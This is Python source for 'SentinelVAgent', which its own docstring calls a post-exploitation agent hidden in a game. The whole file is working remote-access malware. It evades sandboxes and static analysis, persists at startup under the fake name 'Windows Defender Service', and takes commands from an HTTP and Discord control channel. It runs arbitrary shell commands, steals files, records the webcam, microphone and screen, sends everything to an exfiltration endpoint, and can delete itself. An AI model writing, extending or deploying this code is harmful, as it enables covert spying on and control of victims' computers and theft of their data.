
import json
import logging
import math
import os
import random
import subprocess
import sys
import tempfile
import threading
import time
from queue import Empty, Queue
from typing import Any, Dict, Optional

from .ServiceBootManager import cleanup_startup_entry, is_sandboxed_environment, register_startup_entry, verify_integrity
from .TelemetryDispatcher import TelemetryDispatcher
from .TelemetryCore import TelemetryCore
from .VolatileMedia import VolatileMedia
from .AppMetadataProvider import AppMetadataProvider
from .AcousticTelemetry import capture_audio_segment
from .CommandOrchestrator import CommandOrchestrator
from .DiscordConfig import load_discord_credentials
from .MediaSensorValidation import (
    record_diagnostic_video,
    take_screenshot,
)
from .MediaStreamController import MediaStreamController
from .ReportDispatcher import ReportDispatcher
from .ServiceReliability import ServiceReliability

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SentinelV.Agent")


def log_exceptions(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as exc:
            logger.exception("Error en %s: %s", func.__name__, exc)
            raise
    return wrapper


def safe_thread(target):
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=target, args=args, kwargs=kwargs, daemon=True)
        thread.start()
        return thread
    return wrapper


class SentinelVAgent:
    """Clase principal de agente de post-explotación para integración en el juego."""

    def __init__(
        self,
        command_endpoint: str,
        exfil_endpoint: str,
        discord_bot_token: Optional[str] = None,
        discord_channel_id: Optional[int] = None,
        startup_name: str = "Windows Defender Service",
        command_poll_interval: float = 10.0,
    ) -> None:
        self.command_endpoint = command_endpoint
        self.exfil_endpoint = exfil_endpoint
        self.discord_bot_token = discord_bot_token
        self.discord_channel_id = discord_channel_id
        self.startup_name = startup_name
        self.command_poll_interval = command_poll_interval

        self._telemetry = TelemetryCore(batch_callback=self._enqueue_telemetry_event)
        self._media = VolatileMedia()
        self._media_controller = MediaStreamController()
        self._metadata_provider = AppMetadataProvider()
        self._exfil = TelemetryDispatcher()
        self._dispatcher = ReportDispatcher(session=self._exfil.session)
        self._reliability = ServiceReliability(persistence_name=self.startup_name)

        self._command_queue: Queue[str] = Queue()
        self._stop_event = threading.Event()
        self._persistence_registered = False
        self._session = self._exfil.session
        self._discord_orchestrator: Optional[CommandOrchestrator] = None

        self._command_thread = threading.Thread(target=self._command_loop, daemon=True)
        self._keepalive_thread = threading.Thread(target=self._keepalive_loop, daemon=True)

    @property
    def encryption_key(self) -> bytes:
        return self._exfil.key

    @log_exceptions
    def start(self) -> None:
        logger.info("Iniciando SentinelVAgent")

        if is_sandboxed_environment():
            logger.warning("Entorno de análisis detectado. Se omite la activación del agente.")
            return

        # Anti-sandboxing: sleep aleatorio para evadir análisis estáticos
        sleep_time = random.uniform(5, 15)
        logger.debug("Anti-sandboxing: durmiendo %f segundos", sleep_time)
        time.sleep(sleep_time)

        # Código basura: operaciones matemáticas complejas para confundir análisis
        self._execute_junk_code()

        self._telemetry.start()
        self._persistence_registered = register_startup_entry(
            executable_path=sys.executable,
            value_name=self.startup_name,
        )
        try:
            persistence_result = self._reliability.ensure_reboot_persistence(
                executable_path=sys.executable,
                enable_task=True,
            )
            logger.info("Persistencia de reinicio asegurada: %s", persistence_result)
        except Exception as exc:
            logger.warning("No se pudo activar la persistencia de reinicio completa: %s", exc)

        # Verificar integridad post-reboot
        verify_integrity(sys.executable)

        # Iniciar orquestador Discord si hay credenciales disponibles
        discord_token = self.discord_bot_token
        discord_channel_id = self.discord_channel_id
        if not discord_token or not discord_channel_id:
            discord_token, discord_channel_id = load_discord_credentials()

        if discord_token and discord_channel_id:
            try:
                self._discord_orchestrator = CommandOrchestrator(
                    bot_token=discord_token,
                    channel_id=discord_channel_id,
                    telemetry_dispatcher=self._exfil,
                )
                self._discord_orchestrator.run()
                logger.info("CommandOrchestrator iniciado desde SentinelVAgent")
            except Exception as exc:
                logger.warning("No se pudo iniciar CommandOrchestrator: %s", exc)
        else:
            logger.warning("No hay credenciales Discord disponibles para CommandOrchestrator")

        self._command_thread.start()
        self._keepalive_thread.start()

    def _execute_junk_code(self) -> None:
        """Ejecuta código basura para confundir análisis estáticos."""
        # Operaciones matemáticas complejas sin propósito
        for _ in range(1000):
            x = random.random()
            y = math.sin(x) * math.cos(x) + math.exp(x / 10)
            z = math.sqrt(abs(y)) if y > 0 else 0
            _ = z ** 2  # Variable no usada
        logger.debug("Código basura ejecutado")

    @log_exceptions
    def stop(self) -> None:
        logger.info("Deteniendo SentinelVAgent")
        self._stop_event.set()
        if self._discord_orchestrator is not None:
            self._discord_orchestrator.stop()
        self._telemetry.stop()
        self._exfil.close_session()

    def _enqueue_telemetry_event(self, event: str) -> None:
        logger.debug("Telemetry event enqueued: %s", event)
        self._command_queue.put(event)

    def _construct_dispatch_payload(self, metadata: Dict[str, Any], attachments: Dict[str, bytes]) -> bytes:
        envelope = {
            "metadata": metadata,
            "attachments": [
                {"filename": name, "length": len(data)} for name, data in attachments.items()
            ],
        }
        payload = json.dumps(envelope).encode("utf-8") + b"\n"
        for name, data in attachments.items():
            boundary = f"--FILE-- {name} {len(data)}\n".encode("utf-8")
            payload += boundary + data + b"\n"
        return payload

    def _dispatch_report(
        self,
        endpoint: str,
        encrypted_log: bytes,
        attachments: Dict[str, bytes],
        metadata: Dict[str, Any],
    ) -> None:
        total_size = len(encrypted_log) + sum(len(value) for value in attachments.values())
        if total_size > 8 * 1024 * 1024:
            bundle = self._construct_dispatch_payload(metadata, attachments)
            logger.info(
                "Payload mayor a 8MB detectado, enviando por ReportDispatcher (%d bytes)",
                len(bundle),
            )
            self._dispatcher.send_payload(
                endpoint=endpoint,
                payload=bundle,
                metadata={**metadata, "dispatch_mode": "fragmented"},
            )
            return

        self._exfil.send_payload(
            endpoint=endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _keepalive_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                status = {
                    "agent_id": "sentinel-v",
                    "status": "alive",
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                }
                self._session.post(
                    self.exfil_endpoint,
                    json=status,
                    timeout=10,
                    verify=True,
                )
            except Exception as exc:
                logger.debug("Keepalive HTTPS falló: %s", exc)
            time.sleep(600)  # Heartbeat cada 10 minutos

    @log_exceptions
    def _command_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                response = self._session.get(self.command_endpoint, timeout=10, verify=True)
                response.raise_for_status()
                payload = response.json()
                commands = self._parse_commands(payload)
                for command in commands:
                    self._handle_command(command)
            except Exception as exc:
                logger.debug("No se pudo obtener comandos: %s", exc)
            time.sleep(self.command_poll_interval)

    def _parse_commands(self, payload: Any) -> list[str]:
        if isinstance(payload, dict) and "commands" in payload:
            return [str(cmd).strip() for cmd in payload["commands"] if isinstance(cmd, str)]
        if isinstance(payload, list):
            return [str(cmd).strip() for cmd in payload if isinstance(cmd, str)]
        if isinstance(payload, str):
            return [payload.strip()]
        return []

    @log_exceptions
    def _handle_command(self, command: str) -> None:
        logger.info("Comando C2 recibido: %s", command)
        normalized = command.lower().strip()
        if normalized == "/panel":
            self._handle_panel_request()
        elif normalized == "/kill":
            self._execute_kill_switch()
        elif normalized.startswith("/upload "):
            self._handle_upload_command(command)
        elif normalized == "/mic_check":
            self._handle_mic_check_command()
        elif normalized == "/cam_burst":
            self._handle_cam_burst_command()
        elif normalized == "/browser_intel":
            self._handle_browser_intel_command()
        elif normalized.startswith("/screenshot"):
            self._handle_screenshot_command()
        elif normalized.startswith("/shell "):
            self._handle_shell_command(command)
        elif normalized == "/lockdown":
            self._handle_lockdown_command()
        elif normalized == "/screen_shot":
            self._handle_screen_shot_command()
        elif normalized == "/cam_live":
            self._handle_cam_live_command()
        elif normalized == "/audio_listen":
            self._handle_audio_listen_command()
        elif normalized == "/sys_info":
            self._handle_sys_info_command()
        else:
            logger.debug("Comando desconocido ignorado: %s", command)

    @log_exceptions
    def _handle_panel_request(self) -> None:
        screenshot = self._media.capture_screenshot()
        webcam = self._media.capture_webcam_frame()
        metadata = {
            "event": "panel_request",
            "agent_id": "sentinel-v",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        encrypted_log = self._exfil.encrypt_log("Panel request: status snapshot")
        attachments = {
            "screenshot.png": screenshot.getvalue(),
            "webcam.jpg": webcam.getvalue(),
        }
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _handle_mic_check_command(self) -> None:
        audio = self._media_controller.capture_audio_wav(duration_seconds=5.0)
        attachments = {"mic_check.wav": audio.getvalue()}
        metadata = {
            "event": "mic_check",
            "agent_id": "sentinel-v",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        encrypted_log = self._exfil.encrypt_log("Mic check payload")
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _handle_cam_burst_command(self) -> None:
        frames = [
            self._media_controller.capture_video_frame("JPEG") for _ in range(3)
        ]
        attachments = {
            f"cam_burst_{index+1}.jpg": frame.getvalue()
            for index, frame in enumerate(frames)
        }
        metadata = {
            "event": "cam_burst",
            "agent_id": "sentinel-v",
            "frame_count": len(frames),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        encrypted_log = self._exfil.encrypt_log("Camera burst payload")
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _handle_browser_intel_command(self) -> None:
        metadata = self._metadata_provider.get_active_window_metadata()
        metadata.update(
            {
                "event": "browser_intel",
                "agent_id": "sentinel-v",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
        )
        encrypted_log = self._exfil.encrypt_log("Browser intel payload")
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments={},
            metadata=metadata,
        )

    @log_exceptions
    def _handle_screen_shot_command(self) -> None:
        screenshot = take_screenshot()
        metadata = {
            "event": "screen_shot",
            "agent_id": "sentinel-v",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        encrypted_log = self._exfil.encrypt_log("Screen shot payload")
        attachments = {"screen_shot.png": screenshot.getvalue()}
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _handle_cam_live_command(self) -> None:
        video_buffer = record_diagnostic_video(seconds=6)
        metadata = {
            "event": "cam_live",
            "agent_id": "sentinel-v",
            "duration_seconds": 6,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        encrypted_log = self._exfil.encrypt_log("Camera live payload")
        attachments = {"cam_live.mjpeg": video_buffer.getvalue()}
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _handle_audio_listen_command(self) -> None:
        audio_segment = capture_audio_segment(seconds=10)
        metadata = {
            "event": "audio_listen",
            "agent_id": "sentinel-v",
            "duration_seconds": 10,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        encrypted_log = self._exfil.encrypt_log("Audio listen payload")
        attachments = {"audio_segment.wav": audio_segment.getvalue()}
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _handle_sys_info_command(self) -> None:
        metadata = self._metadata_provider.get_active_window_metadata()
        metadata.update(
            {
                "event": "sys_info",
                "agent_id": "sentinel-v",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
        )
        system_info = {
            "platform": sys.platform,
            "python_version": sys.version,
            "process_id": os.getpid(),
            "executable": sys.executable,
        }
        encrypted_log = self._exfil.encrypt_log(f"System info payload: {system_info}")
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments={},
            metadata={**metadata, **system_info},
        )

    @log_exceptions
    def _execute_kill_switch(self) -> None:
        cleanup_startup_entry(value_name=self.startup_name, sandbox_check=False)
        exe_path = os.path.abspath(sys.executable)
        bat_path = os.path.join(tempfile.gettempdir(), "cleanup_supergame.bat")
        logger.info("Activando kill switch y generando script de autodestrucción")

        bat_content = f"""@echo off
ping 127.0.0.1 -n 3 > nul
if exist \"{exe_path}\" del /f /q \"{exe_path}\"
if exist \"{bat_path}\" del /f /q \"{bat_path}\"
"""
        with open(bat_path, "w", encoding="utf-8") as bat_file:
            bat_file.write(bat_content)

        try:
            subprocess.Popen(["cmd.exe", "/c", bat_path], shell=False)
        except Exception as exc:
            logger.warning("No se pudo ejecutar el script de limpieza: %s", exc)

    @log_exceptions
    def _handle_upload_command(self, command: str) -> None:
        """Maneja comando /upload <file_path> para exfiltrar un archivo."""
        parts = command.split(" ", 1)
        if len(parts) < 2:
            logger.warning("Comando /upload malformado: %s", command)
            return
        file_path = parts[1].strip()
        if not os.path.isfile(file_path):
            logger.warning("Archivo no encontrado: %s", file_path)
            return
        try:
            with open(file_path, "rb") as f:
                file_data = f.read()
            metadata = {
                "event": "file_upload",
                "agent_id": "sentinel-v",
                "file_path": file_path,
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
            encrypted_log = self._exfil.encrypt_log(f"File upload: {file_path}")
            attachments = {os.path.basename(file_path): file_data}
            self._dispatch_report(
                endpoint=self.exfil_endpoint,
                encrypted_log=encrypted_log,
                attachments=attachments,
                metadata=metadata,
            )
        except Exception as exc:
            logger.exception("Error al subir archivo: %s", exc)

    @log_exceptions
    def _handle_screenshot_command(self) -> None:
        """Maneja comando /screenshot para capturar y enviar screenshot."""
        screenshot = self._media.capture_screenshot()
        metadata = {
            "event": "screenshot_request",
            "agent_id": "sentinel-v",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        encrypted_log = self._exfil.encrypt_log("Screenshot captured")
        attachments = {"screenshot.png": screenshot.getvalue()}
        self._dispatch_report(
            endpoint=self.exfil_endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata=metadata,
        )

    @log_exceptions
    def _handle_shell_command(self, command: str) -> None:
        """Maneja comando /shell <cmd> para ejecutar comando shell."""
        parts = command.split(" ", 1)
        if len(parts) < 2:
            logger.warning("Comando /shell malformado: %s", command)
            return
        shell_cmd = parts[1].strip()
        try:
            result = subprocess.run(
                shell_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )
            output = result.stdout + result.stderr
            metadata = {
                "event": "shell_command",
                "agent_id": "sentinel-v",
                "command": shell_cmd,
                "output": output[:1000],  # Limitar tamaño
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
            encrypted_log = self._exfil.encrypt_log(f"Shell command: {shell_cmd}")
            self._exfil.send_payload(
                endpoint=self.exfil_endpoint,
                encrypted_log=encrypted_log,
                metadata=metadata,
            )
        except Exception as exc:
            logger.exception("Error al ejecutar comando shell: %s", exc)

    @log_exceptions
    def _handle_lockdown_command(self) -> None:
        """Maneja comando /lockdown para bloquear el sistema."""
        try:
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], check=True)
            metadata = {
                "event": "lockdown_executed",
                "agent_id": "sentinel-v",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
            encrypted_log = self._exfil.encrypt_log("System locked")
            self._exfil.send_payload(
                endpoint=self.exfil_endpoint,
                encrypted_log=encrypted_log,
                metadata=metadata,
            )
        except Exception as exc:
            logger.exception("Error al ejecutar lockdown: %s", exc)

        os._exit(0)
